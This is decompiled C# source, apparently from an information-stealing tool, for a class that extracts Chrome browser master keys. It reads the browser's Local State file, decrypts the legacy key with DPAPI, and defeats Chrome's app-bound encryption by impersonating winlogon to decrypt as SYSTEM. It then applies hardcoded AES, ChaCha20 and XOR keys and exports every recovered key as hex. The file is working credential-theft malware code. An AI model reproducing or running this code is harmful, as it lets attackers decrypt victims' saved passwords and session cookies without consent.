using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace Intelix.Helper.Encrypted
{
	// Token: 0x02000074 RID: 116
	public static class LocalState
	{
		// Token: 0x060001C6 RID: 454 RVA: 0x000166DC File Offset: 0x000148DC
		public static List<string[]> GetMasterKeys()
		{
			List<string[]> list = new List<string[]>();
			foreach (KeyValuePair<string, Lazy<byte[]>> keyValuePair in LocalState._masterKeyCacheV10)
			{
				try
				{
					string text = keyValuePair.Key ?? "";
					Lazy<byte[]> value = keyValuePair.Value;
					bool flag = value == null;
					if (!flag)
					{
						byte[] value2 = value.Value;
						bool flag2 = value2 != null;
						if (flag2)
						{
							StringBuilder stringBuilder = new StringBuilder(value2.Length * 2);
							byte[] array = value2;
							foreach (byte b in array)
							{
								stringBuilder.Append(b.ToString("X2"));
							}
							list.Add(new string[]
							{
								text,
								"v10",
								stringBuilder.ToString()
							});
						}
					}
				}
				catch
				{
				}
			}
			foreach (KeyValuePair<string, Lazy<byte[]>> keyValuePair2 in LocalState._masterKeyCacheV20)
			{
				try
				{
					string text2 = keyValuePair2.Key ?? "";
					Lazy<byte[]> value3 = keyValuePair2.Value;
					bool flag3 = value3 == null;
					if (!flag3)
					{
						byte[] value4 = value3.Value;
						bool flag4 = value4 != null;
						if (flag4)
						{
							StringBuilder stringBuilder2 = new StringBuilder(value4.Length * 2);
							byte[] array3 = value4;
							foreach (byte b2 in array3)
							{
								stringBuilder2.Append(b2.ToString("X2"));
							}
							list.Add(new string[]
							{
								text2,
								"v20",
								stringBuilder2.ToString()
							});
						}
					}
				}
				catch
				{
				}
			}
			return list;
		}

		// Token: 0x060001C7 RID: 455 RVA: 0x00016900 File Offset: 0x00014B00
		public static byte[] MasterKeyV20(string localstate)
		{
			SemaphoreSlim orAdd = LocalState._locks.GetOrAdd(localstate, (string _) => new SemaphoreSlim(1, 1));
			orAdd.Wait();
			byte[] value;
			try
			{
				Lazy<byte[]> lazy;
				bool flag = LocalState._masterKeyCacheV20.TryGetValue(localstate, out lazy);
				if (flag)
				{
					value = lazy.Value;
				}
				else
				{
					Lazy<byte[]> lazy2 = new Lazy<byte[]>(() => LocalState.ComputeMasterKeyV20(localstate));
					LocalState._masterKeyCacheV20[localstate] = lazy2;
					value = lazy2.Value;
				}
			}
			finally
			{
				orAdd.Release();
			}
			return value;
		}

		// Token: 0x060001C8 RID: 456 RVA: 0x000169C0 File Offset: 0x00014BC0
		private static byte[] ComputeMasterKeyV20(string localstate)
		{
			byte[] result;
			try
			{
				Match match = Regex.Match(LocalState.LocalStateContent(localstate), "\"app_bound_encrypted_key\"\\s*:\\s*\"([^\"]+)\"");
				bool flag = !match.Success;
				if (flag)
				{
					result = null;
				}
				else
				{
					BlobParsedData blobParsedData = ParseKeyBlob.Parse(LocalState.DecryptAsSystemUser(Convert.FromBase64String(match.Groups[1].Value).Skip(4).ToArray<byte>()));
					byte flag2 = blobParsedData.Flag;
					byte b = flag2;
					switch (b)
					{
					case 1:
						result = AesGcm256.Decrypt(new byte[]
						{
							179,
							28,
							110,
							36,
							26,
							200,
							70,
							114,
							141,
							169,
							193,
							250,
							196,
							147,
							102,
							81,
							207,
							251,
							148,
							77,
							20,
							58,
							184,
							22,
							39,
							107,
							204,
							109,
							160,
							40,
							71,
							135
						}, blobParsedData.Iv, null, blobParsedData.Ciphertext, blobParsedData.Tag);
						break;
					case 2:
						result = ChaCha20Poly1305.Decrypt(new byte[]
						{
							233,
							143,
							55,
							215,
							244,
							225,
							250,
							67,
							61,
							25,
							48,
							77,
							194,
							37,
							128,
							66,
							9,
							14,
							45,
							29,
							126,
							234,
							118,
							112,
							212,
							31,
							115,
							141,
							8,
							114,
							150,
							96
						}, blobParsedData.Iv, blobParsedData.Ciphertext, blobParsedData.Tag, null);
						break;
					case 3:
					{
						byte[] array = new byte[]
						{
							204,
							248,
							161,
							206,
							197,
							102,
							5,
							184,
							81,
							117,
							82,
							186,
							26,
							45,
							6,
							28,
							3,
							162,
							158,
							144,
							39,
							79,
							178,
							252,
							245,
							155,
							164,
							183,
							92,
							57,
							35,
							144
						};
						byte[] array2 = LocalState.CDecryptor(blobParsedData.EncryptedAesKey);
						for (int i = 0; i < array2.Length; i++)
						{
							byte[] array3 = array2;
							int num = i;
							array3[num] ^= array[i];
						}
						result = AesGcm256.Decrypt(array2, blobParsedData.Iv, null, blobParsedData.Ciphertext, blobParsedData.Tag);
						break;
					}
					default:
						if (b != 32)
						{
							result = null;
						}
						else
						{
							result = blobParsedData.EncryptedAesKey;
						}
						break;
					}
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x060001C9 RID: 457 RVA: 0x00016B50 File Offset: 0x00014D50
		public static byte[] MasterKeyV10(string localstate)
		{
			SemaphoreSlim orAdd = LocalState._locks.GetOrAdd(localstate, (string _) => new SemaphoreSlim(1, 1));
			orAdd.Wait();
			byte[] value;
			try
			{
				Lazy<byte[]> lazy;
				bool flag = LocalState._masterKeyCacheV10.TryGetValue(localstate, out lazy);
				if (flag)
				{
					value = lazy.Value;
				}
				else
				{
					Lazy<byte[]> lazy2 = new Lazy<byte[]>(() => LocalState.ComputeMasterKeyV10(localstate));
					LocalState._masterKeyCacheV10[localstate] = lazy2;
					value = lazy2.Value;
				}
			}
			finally
			{
				orAdd.Release();
			}
			return value;
		}

		// Token: 0x060001CA RID: 458 RVA: 0x00016C10 File Offset: 0x00014E10
		private static byte[] ComputeMasterKeyV10(string localstate)
		{
			byte[] result;
			try
			{
				Match match = Regex.Match(LocalState.LocalStateContent(localstate), "\"encrypted_key\":\"(.*?)\"");
				bool flag = !match.Success;
				if (flag)
				{
					result = null;
				}
				else
				{
					result = DpApi.Decrypt(Convert.FromBase64String(match.Groups[1].Value).Skip(5).ToArray<byte>());
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x060001CB RID: 459 RVA: 0x00016C84 File Offset: 0x00014E84
		private static byte[] CDecryptor(byte[] encryptedData)
		{
			byte[] result;
			using (ImpersonationHelper.ImpersonateWinlogon())
			{
				result = CngDecryptor.Decrypt(encryptedData, "Microsoft Software Key Storage Provider", "Google Chromekey1");
			}
			return result;
		}

		// Token: 0x060001CC RID: 460 RVA: 0x00016CC8 File Offset: 0x00014EC8
		private static byte[] DecryptAsSystemUser(byte[] encryptedData)
		{
			using (ImpersonationHelper.ImpersonateWinlogon())
			{
				encryptedData = DpApi.Decrypt(encryptedData);
			}
			return DpApi.Decrypt(encryptedData);
		}

		// Token: 0x060001CD RID: 461 RVA: 0x00016D10 File Offset: 0x00014F10
		private static string LocalStateContent(string localstate)
		{
			string text = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
			File.Copy(localstate, text, true);
			string result = File.ReadAllText(text);
			File.Delete(text);
			return result;
		}

		// Token: 0x04000061 RID: 97
		private static readonly ConcurrentDictionary<string, Lazy<byte[]>> _masterKeyCacheV10 = new ConcurrentDictionary<string, Lazy<byte[]>>();

		// Token: 0x04000062 RID: 98
		private static readonly ConcurrentDictionary<string, Lazy<byte[]>> _masterKeyCacheV20 = new ConcurrentDictionary<string, Lazy<byte[]>>();

		// Token: 0x04000063 RID: 99
		private static readonly ConcurrentDictionary<string, SemaphoreSlim> _locks = new ConcurrentDictionary<string, SemaphoreSlim>();
	}
}
